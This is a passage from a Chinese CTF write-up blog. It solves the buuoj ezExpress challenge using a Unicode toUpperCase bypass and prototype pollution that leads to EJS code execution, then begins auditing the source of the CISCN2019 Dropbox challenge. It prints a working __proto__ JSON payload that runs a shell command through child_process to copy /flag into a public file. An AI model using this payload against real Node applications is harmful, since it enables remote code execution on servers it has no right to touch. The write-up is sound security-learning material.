<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">     msg: <span class="string">''</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!ip.includes(<span class="string">'127.0.0.1'</span>)) &#123;</span><br><span class="line">     obj.msg=<span class="string">"only admin's ip can use it"</span></span><br><span class="line">     res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">     <span class="keyword">return</span> </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>















<h1 id="ezExpress"><a href="#ezExpress" class="headerlink" title="ezExpress"></a>ezExpress</h1><p>打开题目是一个登录界面</p>
<p><img src="../pic/127.png" alt=""></p>
<p>随意输入一下看看404有什么东西，得到了网页的绝对地址/app</p>
<p><img src="../pic/130.png" alt=""></p>
<p>扫描发现有源码<a href="http://www.zip,先查看route下的源码" target="_blank" rel="noopener">www.zip,先查看route下的源码</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;   <span class="comment">//不能包含admin</span></span><br><span class="line">  <span class="keyword">if</span>(keyword.match(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">'/login'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.body.Submit==<span class="string">"register"</span>)</span><br><span class="line">   <span class="keyword">if</span>(safeKeyword(req.body.userid))&#123;      <span class="comment">//调用safeKeyword函数进行过滤</span></span><br><span class="line">    res.end(<span class="string">"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;"</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;   <span class="comment">//将用户名，密码写入session</span></span><br><span class="line">      <span class="string">'user'</span>:req.body.userid.toUpperCase(),   <span class="comment">//将输入转成大写</span></span><br><span class="line">      <span class="string">'passwd'</span>: req.body.pwd,</span><br><span class="line">      <span class="string">'isLogin'</span>:<span class="literal">false</span></span><br><span class="line">    &#125;&#123;</span><br><span class="line">    res.redirect(<span class="string">'/'</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.body.Submit==<span class="string">"login"</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.user)&#123;res.end(<span class="string">"&lt;script&gt;alert('register first');history.go(-1);&lt;/script&gt;"</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">      req.session.user.isLogin=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.end(<span class="string">"&lt;script&gt;alert('error passwd');history.go(-1);&lt;/script&gt;"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>觉得<code>toUpperCase</code>有点可疑，<a href="https://xz.aliyun.com/t/7184#toc-11" target="_blank" rel="noopener">查找资料</a>后发现</p>
<p>对于toUpperCase():</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</span><br></pre></td></tr></table></figure>

<p>对于toLowerCase():</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)</span><br></pre></td></tr></table></figure>

<p>使用adm<code>ı</code>n注册  </p>
<p>merge、clone 可能触发原型链污染（暂时没有弄懂为什么会造成原型链污染）<a href="https://xz.aliyun.com/t/7184#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/7184#toc-5</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">router.post(&#39;&#x2F;action&#39;, function (req, res) &#123;</span><br><span class="line">  if(req.session.user.user!&#x3D;&quot;ADMIN&quot;)&#123;res.end(&quot;&lt;script&gt;alert(&#39;ADMIN is asked&#39;);history.go(-1);&lt;&#x2F;script&gt;&quot;)&#125; </span><br><span class="line">  req.session.user.data &#x3D; clone(req.body);</span><br><span class="line">  res.end(&quot;&lt;script&gt;alert(&#39;success&#39;);history.go(-1);&lt;&#x2F;script&gt;&quot;);  </span><br><span class="line">&#125;);</span><br><span class="line">router.get(&#39;&#x2F;info&#39;, function (req, res) &#123;</span><br><span class="line">  res.render(&#39;index&#39;,data&#x3D;&#123;&#39;user&#39;:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><code>/action</code>代码对post传入的数据进行了clone操作,触发原型链污染。render造成代码执行<a href="[https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/](https://evi0s.com/2019/08/30/expresslodashejs-从原型链污染到rce/)">参考链接</a></p>
<p>传入可造成任意代码执行的数据，提示已经给出，flag在/flag文件中，由于无法显示出来，所以将内容输出到文件，路径已经从404报错页面得到，框架对外显示的路径都是/public/</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;action HTTP&#x2F;1.1</span><br><span class="line">Host: f59a86b7-025d-4112-8179-5408079236b0.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko&#x2F;20100101 Firefox&#x2F;72.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Origin: http:&#x2F;&#x2F;f59a86b7-025d-4112-8179-5408079236b0.node3.buuoj.cn</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;f59a86b7-025d-4112-8179-5408079236b0.node3.buuoj.cn&#x2F;</span><br><span class="line">Cookie: session&#x3D;s%3AG1zgVNFpJSA-czxyV6IyZ_mCJSStbn_6.Tw40woUQYqkMMTqBQl2SDs8Td0Og%2FepP2NS%2FT24zFK8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 133</span><br><span class="line"></span><br><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;: &quot;a;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;cat &#x2F;flag &gt; &#x2F;app&#x2F;public&#x2F;a.txt&#39;);&#x2F;&#x2F;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>访问/info触发代码执行</p>
<p><img src="../pic/129.png" alt=""></p>
<p>访问/a.txt得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;6d73d1f0-0865-44c3-9851-4e6f38dd58be&#125;</span><br></pre></td></tr></table></figure>





<p>参考链接：<a href="https://www.zhaoj.in/read-6462.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6462.html</a></p>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录12-CISCN2019</title>
    <url>/2020/02/10/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%9512-CISCN2019/</url>
    <content><![CDATA[<h2 id="华北赛区-Day1-Web1-Dropbox"><a href="#华北赛区-Day1-Web1-Dropbox" class="headerlink" title="华北赛区 Day1 Web1 Dropbox"></a>华北赛区 Day1 Web1 Dropbox</h2><p>拿到题目是一个登入页面</p>
<p>注册，登入，上传文件</p>
<p>上传一个图片，上传成功。点击下载，下载时发现有任意文件下载漏洞</p>
<p>把文件下载下来进行代码审计</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;index.php</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1, shrink-to-fit&#x3D;no&quot;&gt;</span><br><span class="line">&lt;title&gt;网盘管理&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;panel.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;static&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;static&#x2F;js&#x2F;bootstrap.bundle.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;static&#x2F;js&#x2F;toast.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;static&#x2F;js&#x2F;panel.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;nav aria-label&#x3D;&quot;breadcrumb&quot;&gt;</span><br><span class="line">    &lt;ol class&#x3D;&quot;breadcrumb&quot;&gt;</span><br><span class="line">        &lt;li class&#x3D;&quot;breadcrumb-item active&quot;&gt;管理面板&lt;&#x2F;li&gt;</span><br><span class="line">        &lt;li class&#x3D;&quot;breadcrumb-item active&quot;&gt;&lt;label for&#x3D;&quot;fileInput&quot; class&#x3D;&quot;fileLabel&quot;&gt;上传文件&lt;&#x2F;label&gt;&lt;&#x2F;li&gt;</span><br><span class="line">        &lt;li class&#x3D;&quot;active ml-auto&quot;&gt;&lt;a href&#x3D;&quot;#&quot;&gt;你好 &lt;?php echo $_SESSION[&#39;username&#39;]?&gt;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;&#x2F;ol&gt;</span><br><span class="line">&lt;&#x2F;nav&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; id&#x3D;&quot;fileInput&quot; class&#x3D;&quot;hidden&quot;&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;top&quot; id&#x3D;&quot;toast-container&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new FileList($_SESSION[&#39;sandbox&#39;]);</span><br><span class="line">$a-&gt;Name();</span><br><span class="line">$a-&gt;Size();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;download.php</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&#39;filename&#39;])) &#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line">ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:&#x2F;etc:&#x2F;tmp&quot;);</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[&#39;sandbox&#39;]);</span><br><span class="line">$file &#x3D; new File();</span><br><span class="line">$filename &#x3D; (string) $_POST[&#39;filename&#39;];</span><br><span class="line">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) &#x3D;&#x3D;&#x3D; false) &#123;   &#x2F;&#x2F;stristr 搜索字符串在另一字符串中的第一次出现不区分大小写</span><br><span class="line">    Header(&quot;Content-type: application&#x2F;octet-stream&quot;);</span><br><span class="line">    Header(&quot;Content-Disposition: attachment; filename&#x3D;&quot; . basename($filename));</span><br><span class="line">    echo $file-&gt;close();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;File not exist&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;delete.php</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&#39;filename&#39;])) &#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[&#39;sandbox&#39;]);</span><br><span class="line">$file &#x3D; new File();</span><br><span class="line">$filename &#x3D; (string) $_POST[&#39;filename&#39;];</span><br><span class="line">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(&quot;Content-type: application&#x2F;json&quot;);</span><br><span class="line">    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    Header(&quot;Content-type: application&#x2F;json&quot;);</span><br><span class="line">    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;File not exist&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;register.php</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: index.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">  &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1, shrink-to-fit&#x3D;no&quot;&gt;</span><br><span class="line">  &lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class="line">  &lt;title&gt;注册&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- Bootstrap core CSS --&gt;</span><br><span class="line">  &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    .bd-placeholder-img &#123;</span><br><span class="line">      font-size: 1.125rem;</span><br><span class="line">      text-anchor: middle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @media (min-width: 768px) &#123;</span><br><span class="line">      .bd-placeholder-img-lg &#123;</span><br><span class="line">        font-size: 3.5rem;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;&#x2F;style&gt;</span><br><span class="line">  &lt;!-- Custom styles for this template --&gt;</span><br><span class="line">  &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;std.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body class&#x3D;&quot;text-center&quot;&gt;</span><br><span class="line">  &lt;form class&#x3D;&quot;form-signin&quot; action&#x3D;&quot;register.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">    &lt;h1 class&#x3D;&quot;h3 mb-3 font-weight-normal&quot;&gt;注册&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;username&quot; class&#x3D;&quot;sr-only&quot;&gt;Username&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;Username&quot; required autofocus&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;password&quot; class&#x3D;&quot;sr-only&quot;&gt;Password&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;Password&quot; required&gt;</span><br><span class="line">    &lt;button class&#x3D;&quot;btn btn-lg btn-primary btn-block&quot; type&#x3D;&quot;submit&quot;&gt;提交&lt;&#x2F;button&gt;</span><br><span class="line">    &lt;p class&#x3D;&quot;mt-5 mb-3 text-muted&quot;&gt;&amp;copy; 2018-2019&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;top&quot; id&#x3D;&quot;toast-container&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;bootstrap.bundle.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;toast.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123;</span><br><span class="line">    $u &#x3D; new User();</span><br><span class="line">    $username &#x3D; (string) $_POST[&quot;username&quot;];</span><br><span class="line">    $password &#x3D; (string) $_POST[&quot;password&quot;];</span><br><span class="line">    if (strlen($username) &lt; 20 &amp;&amp; strlen($username) &gt; 2 &amp;&amp; strlen($password) &gt; 1) &#123;</span><br><span class="line">        if ($u-&gt;add_user($username, $password)) &#123;</span><br><span class="line">            echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;login.php?register&#39;;&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;toast(&#39;此用户名已被使用&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;script&gt;toast(&#39;请输入有效用户名和密码&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;class.php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$dbaddr &#x3D; &quot;127.0.0.1&quot;;</span><br><span class="line">$dbuser &#x3D; &quot;root&quot;;</span><br><span class="line">$dbpass &#x3D; &quot;root&quot;;</span><br><span class="line">$dbname &#x3D; &quot;dropbox&quot;;</span><br><span class="line">$db &#x3D; new mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line"></span><br><span class="line">class User &#123;</span><br><span class="line">    public $db;</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        global $db;</span><br><span class="line">        $this-&gt;db &#x3D; $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function user_exist($username) &#123;</span><br><span class="line">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;username&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ? LIMIT 1;&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count &#x3D; $stmt-&gt;num_rows;</span><br><span class="line">        if ($count &#x3D;&#x3D;&#x3D; 0) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function add_user($username, $password) &#123;</span><br><span class="line">        if ($this-&gt;user_exist($username)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class="line">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;INSERT INTO &#96;users&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;) VALUES (NULL, ?, ?);&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function verify_user($username, $password) &#123;</span><br><span class="line">        if (!$this-&gt;user_exist($username)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class="line">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;password&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ?;&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        if (isset($expect) &amp;&amp; $expect &#x3D;&#x3D;&#x3D; $password) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $this-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class FileList &#123;</span><br><span class="line">    private $files;</span><br><span class="line">    private $results;</span><br><span class="line">    private $funcs;</span><br><span class="line"></span><br><span class="line">    public function __construct($path) &#123;</span><br><span class="line">        $this-&gt;files &#x3D; array();</span><br><span class="line">        $this-&gt;results &#x3D; array();</span><br><span class="line">        $this-&gt;funcs &#x3D; array();</span><br><span class="line">        $filenames &#x3D; scandir($path);</span><br><span class="line"></span><br><span class="line">        $key &#x3D; array_search(&quot;.&quot;, $filenames);</span><br><span class="line">        unset($filenames[$key]);   &#x2F;&#x2F;销毁变量</span><br><span class="line">        $key &#x3D; array_search(&quot;..&quot;, $filenames);</span><br><span class="line">        unset($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        foreach ($filenames as $filename) &#123;</span><br><span class="line">            $file &#x3D; new File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push($this-&gt;files, $file);</span><br><span class="line">            $this-&gt;results[$file-&gt;name()] &#x3D; array();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($func, $args) &#123;  &#x2F;&#x2F;调用本类不存在的方法，将方法添加到funcs数组中，并将file类中的</span><br><span class="line">        array_push($this-&gt;funcs, $func);   </span><br><span class="line">        foreach ($this-&gt;files as $file) &#123;</span><br><span class="line">            $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $table &#x3D; &#39;&lt;div id&#x3D;&quot;container&quot; class&#x3D;&quot;container&quot;&gt;&lt;div class&#x3D;&quot;table-responsive&quot;&gt;&lt;table id&#x3D;&quot;table&quot; class&#x3D;&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;</span><br><span class="line">        $table .&#x3D; &#39;&lt;thead&gt;&lt;tr&gt;&#39;;</span><br><span class="line">        foreach ($this-&gt;funcs as $func) &#123;</span><br><span class="line">            $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;&#x2F;th&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;Opt&lt;&#x2F;th&gt;&#39;;</span><br><span class="line">        $table .&#x3D; &#39;&lt;&#x2F;thead&gt;&lt;tbody&gt;&#39;;</span><br><span class="line">        foreach ($this-&gt;results as $filename &#x3D;&gt; $result) &#123;</span><br><span class="line">            $table .&#x3D; &#39;&lt;tr&gt;&#39;;</span><br><span class="line">            foreach ($result as $func &#x3D;&gt; $value) &#123;</span><br><span class="line">                $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;&#x2F;td&gt;&#39;;    &#x2F;&#x2F;将$value转换为 HTML 实体</span><br><span class="line">            &#125;</span><br><span class="line">            $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot; filename&#x3D;&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;download&quot;&gt;下载&lt;&#x2F;a&gt; &#x2F; &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;delete&quot;&gt;删除&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&#39;;</span><br><span class="line">            $table .&#x3D; &#39;&lt;&#x2F;tr&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class File &#123;</span><br><span class="line">    public $filename;</span><br><span class="line"></span><br><span class="line">    public function open($filename) &#123;</span><br><span class="line">        $this-&gt;filename &#x3D; $filename;</span><br><span class="line">        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function name() &#123;</span><br><span class="line">        return basename($this-&gt;filename);  &#x2F;&#x2F;返回路径中的文件名部分</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function size() &#123;</span><br><span class="line">        $size &#x3D; filesize($this-&gt;filename);</span><br><span class="line">        $units &#x3D; array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);</span><br><span class="line">        for ($i &#x3D; 0; $size &gt;&#x3D; 1024 &amp;&amp; $i &lt; 4; $i++) $size &#x2F;&#x3D; 1024;</span><br><span class="line">        return round($size, 2).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function detele() &#123;</span><br><span class="line">        unlink($this-&gt;filename);  &#x2F;&#x2F;删除文件</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function close() &#123;</span><br><span class="line">        return file_get_contents($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

